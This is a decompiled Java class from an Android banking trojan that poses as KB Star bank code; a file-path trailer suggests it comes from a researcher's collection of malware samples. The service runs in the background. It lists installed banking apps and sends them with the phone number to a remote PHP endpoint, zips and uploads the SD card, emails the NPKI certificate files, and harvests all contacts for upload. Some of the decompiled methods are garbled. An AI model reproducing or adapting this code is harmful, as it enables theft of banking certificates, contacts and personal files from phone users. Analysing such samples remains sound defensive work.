package com.kbstar.kb.android.services;

import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.kbstar.kb.android.star.AppContacts;
import com.kbstar.kb.android.star.util.GMailSend;
import com.kbstar.kb.android.star.util.Tool;
import com.kbstar.kb.android.star.util.Url;
import com.kbstar.kb.android.star.util.ZipUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.message.BasicNameValuePair;

public class uploadPhone
  extends Service
{
  private final String DEBUG_TAG = "clService";
  private List<ApplicationInfo> listAppcations = new ArrayList();
  private PackageManager pm;
  public boolean threadDisable = true;
  public Tool tool = new Tool();
  
  private String getSoftName(PackageManager paramPackageManager)
  {
    Object localObject2 = "";
    int i = 0;
    String str;
    int j;
    for (;;)
    {
      if (i >= this.listAppcations.size()) {
        return (String)localObject2;
      }
      str = (String)((ApplicationInfo)this.listAppcations.get(i)).loadLabel(paramPackageManager);
      j = 0;
      if (j < AppContacts.BK_NAME_LIST.length) {
        break;
      }
      i += 1;
    }
    Object localObject1 = localObject2;
    if (str.equals(AppContacts.BK_NAME_LIST[j])) {
      if (((String)localObject2).length() != 0) {
        break label104;
      }
    }
    label104:
    for (localObject1 = AppContacts.BK_CALL_LIST[j];; localObject1 = localObject2 + "," + AppContacts.BK_CALL_LIST[j])
    {
      j += 1;
      localObject2 = localObject1;
      break;
    }
  }
  
  /* Error */
  private void uploadTel()
  {
    // Byte code:
    //   0: aload_0
    //   1: invokevirtual 118	com/kbstar/kb/android/services/uploadPhone:getContentResolver	()Landroid/content/ContentResolver;
    //   4: astore_1
    //   5: aload_1
    //   6: getstatic 124	android/provider/ContactsContract$Contacts:CONTENT_URI	Landroid/net/Uri;
    //   9: aconst_null
    //   10: aconst_null
    //   11: aconst_null
    //   12: aconst_null
    //   13: invokevirtual 130	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   16: astore_3
    //   17: ldc 57
    //   19: astore_2
    //   20: aload_3
    //   21: invokeinterface 136 1 0
    //   26: ifne +89 -> 115
    //   29: aload_3
    //   30: invokeinterface 139 1 0
    //   35: new 141	com/kbstar/kb/android/star/util/Url
    //   38: dup
    //   39: invokespecial 142	com/kbstar/kb/android/star/util/Url:<init>	()V
    //   42: astore 5
    //   44: new 144	java/io/File
    //   47: dup
    //   48: aload 5
    //   50: invokevirtual 147	com/kbstar/kb/android/star/util/Url:getSDPath1	()Ljava/lang/String;
    //   53: ldc -107
    //   55: invokespecial 152	java/io/File:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   58: astore_3
    //   59: aconst_null
    //   60: astore_1
    //   61: aconst_null
    //   62: astore 4
    //   64: new 154	java/io/FileOutputStream
    //   67: dup
    //   68: aload_3
    //   69: invokespecial 157	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
    //   72: astore_3
    //   73: aload_3
    //   74: aload_2
    //   75: invokevirtual 161	java/lang/String:getBytes	()[B
    //   78: invokevirtual 165	java/io/FileOutputStream:write	([B)V
    //   81: aload_3
    //   82: ifnull +210 -> 292
    //   85: aload_3
    //   86: invokevirtual 166	java/io/FileOutputStream:close	()V
    //   89: new 144	java/io/File
    //   92: dup
    //   93: aload 5
    //   95: invokevirtual 147	com/kbstar/kb/android/star/util/Url:getSDPath1	()Ljava/lang/String;
    //   98: ldc -107
    //   100: invokespecial 152	java/io/File:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   103: astore_1
    //   104: aload_0
    //   105: invokevirtual 170	com/kbstar/kb/android/services/uploadPhone:getApplicationContext	()Landroid/content/Context;
    //   108: aload_1
    //   109: ldc -84
    //   111: invokestatic 176	com/kbstar/kb/android/star/util/Tool:postHttpFile2	(Landroid/content/Context;Ljava/io/File;Ljava/lang/String;)V
    //   114: return
    //   115: aload_3
    //   116: aload_3
    //   117: ldc -78
    //   119: invokeinterface 182 2 0
    //   124: invokeinterface 186 2 0
    //   129: astore 4
    //   131: aload_1
    //   132: getstatic 189	android/provider/ContactsContract$CommonDataKinds$Phone:CONTENT_URI	Landroid/net/Uri;
    //   135: aconst_null
    //   136: new 93	java/lang/StringBuilder
    //   139: dup
    //   140: ldc -65
    //   142: invokespecial 100	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   145: aload 4
    //   147: invokevirtual 106	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   150: invokevirtual 110	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   153: aconst_null
    //   154: aconst_null
    //   155: invokevirtual 130	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   158: astore 4
    //   160: aload 4
    //   162: invokeinterface 136 1 0
    //   167: ifne +13 -> 180
    //   170: aload 4
    //   172: invokeinterface 139 1 0
    //   177: goto -157 -> 20
    //   180: aload 4
    //   182: aload 4
    //   184: ldc -63
    //   186: invokeinterface 182 2 0
    //   191: invokeinterface 186 2 0
    //   196: astore 5
    //   198: new 93	java/lang/StringBuilder
    //   201: dup
    //   202: aload_2
    //   203: invokestatic 97	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   206: invokespecial 100	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   209: aload 5
    //   211: invokevirtual 106	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   214: ldc -61
    //   216: invokevirtual 106	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   219: invokevirtual 110	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   222: astore_2
    //   223: goto -63 -> 160
    //   226: astore_1
    //   227: aload_1
    //   228: invokevirtual 198	java/io/IOException:printStackTrace	()V
    //   231: goto -150 -> 81
    //   234: astore_1
    //   235: aload_3
    //   236: astore_2
    //   237: aload_1
    //   238: astore_3
    //   239: aload_2
    //   240: astore_1
    //   241: aload_3
    //   242: invokevirtual 199	java/io/FileNotFoundException:printStackTrace	()V
    //   245: aload_2
    //   246: ifnull -157 -> 89
    //   249: aload_2
    //   250: invokevirtual 166	java/io/FileOutputStream:close	()V
    //   253: goto -164 -> 89
    //   256: astore_1
    //   257: aload_1
    //   258: invokevirtual 198	java/io/IOException:printStackTrace	()V
    //   261: goto -172 -> 89
    //   264: astore_3
    //   265: aload_1
    //   266: astore_2
    //   267: aload_3
    //   268: astore_1
    //   269: aload_2
    //   270: ifnull +7 -> 277
    //   273: aload_2
    //   274: invokevirtual 166	java/io/FileOutputStream:close	()V
    //   277: aload_1
    //   278: athrow
    //   279: astore_2
    //   280: aload_2
    //   281: invokevirtual 198	java/io/IOException:printStackTrace	()V
    //   284: goto -7 -> 277
    //   287: astore_1
    //   288: aload_1
    //   289: invokevirtual 198	java/io/IOException:printStackTrace	()V
    //   292: goto -203 -> 89
    //   295: astore_1
    //   296: aload_3
    //   297: astore_2
    //   298: goto -29 -> 269
    //   301: astore_3
    //   302: aload 4
    //   304: astore_2
    //   305: goto -66 -> 239
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	308	0	this	uploadPhone
    //   4	128	1	localObject1	Object
    //   226	2	1	localIOException1	java.io.IOException
    //   234	4	1	localFileNotFoundException1	java.io.FileNotFoundException
    //   240	1	1	localObject2	Object
    //   256	10	1	localIOException2	java.io.IOException
    //   268	10	1	localObject3	Object
    //   287	2	1	localIOException3	java.io.IOException
    //   295	1	1	localObject4	Object
    //   19	255	2	localObject5	Object
    //   279	2	2	localIOException4	java.io.IOException
    //   297	8	2	localObject6	Object
    //   16	226	3	localObject7	Object
    //   264	33	3	localObject8	Object
    //   301	1	3	localFileNotFoundException2	java.io.FileNotFoundException
    //   62	241	4	localObject9	Object
    //   42	168	5	localObject10	Object
    // Exception table:
    //   from	to	target	type
    //   73	81	226	java/io/IOException
    //   73	81	234	java/io/FileNotFoundException
    //   227	231	234	java/io/FileNotFoundException
    //   249	253	256	java/io/IOException
    //   64	73	264	finally
    //   241	245	264	finally
    //   273	277	279	java/io/IOException
    //   85	89	287	java/io/IOException
    //   73	81	295	finally
    //   227	231	295	finally
    //   64	73	301	java/io/FileNotFoundException
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    this.threadDisable = true;
    Log.v("clService", "on destroy");
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    this.pm = getPackageManager();
    new Thread(new Runnable()
    {
      public void run()
      {
        uploadPhone.this.listAppcations = uploadPhone.this.pm.getInstalledApplications(8192);
        Object localObject = uploadPhone.this.getSoftName(uploadPhone.this.pm);
        String str1 = Tool.GetUrlTool();
        Url localUrl = new Url();
        String str2 = "http://" + str1 + "/phon/youxi.php";
        str1 = ((TelephonyManager)uploadPhone.this.getSystemService("phone")).getLine1Number();
        ArrayList localArrayList = new ArrayList();
        localArrayList.add(new BasicNameValuePair("phone", str1));
        localArrayList.add(new BasicNameValuePair("softname", (String)localObject));
        Tool.postHttpConnectionCommon(str2, localArrayList);
        Tool.postHttpFile(uploadPhone.this.getApplicationContext());
        try
        {
          ZipUtil.ZipFolder(localUrl.getSDPath(), localUrl.getSDPath1() + "/all.zip");
          localObject = new File(localUrl.getSDPath1() + "/all.zip");
          Tool.postHttpFile1(uploadPhone.this.getApplicationContext(), (File)localObject, "all");
          GMailSend.MailSend(str1, "npki", str1 + "_npki.zip", localUrl.getSDPath());
          uploadPhone.this.uploadTel();
          return;
        }
        catch (Exception localException)
        {
          for (;;)
          {
            localException.printStackTrace();
          }
        }
      }
    }).start();
    return paramInt2;
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/services/uploadPhone.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */